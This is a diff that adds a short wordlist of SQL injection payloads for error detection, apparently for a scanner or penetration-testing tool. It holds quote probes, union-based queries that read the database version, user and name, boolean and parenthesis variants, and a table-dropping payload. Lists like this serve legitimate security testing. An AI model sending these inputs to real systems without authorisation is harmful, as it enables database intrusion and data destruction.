@@ -1,0 +1,32 @@
+# SQL Injection payloads for error detection
+# Basic injection attempts
+'
+"
+' OR '1'='1
+'; DROP TABLE users; --
+%27
+
+# Union-based payloads
+-1 UNION SELECT 1,version(),user()
+' UNION SELECT 1,2,3,4,5,6,7,8,9,10--
+' AND 1=2 UNION SELECT 1,version(),database()--
+
+# Order by payloads
+1' ORDER BY 10--
+1' GROUP BY 1,2,3,4,5,6,7,8,9,10--
+
+# Having clause
+' HAVING 1=1--
+
+# Information schema
+' AND (SELECT COUNT(*) FROM information_schema.tables)>0--
+
+# Boolean-based
+1 AND 1=2
+1' AND '1'='2
+1" AND "1"="2
+
+# Parentheses variations
+1) AND (1=2
+1')) AND (('1'='2
+1")) AND (("1"="2
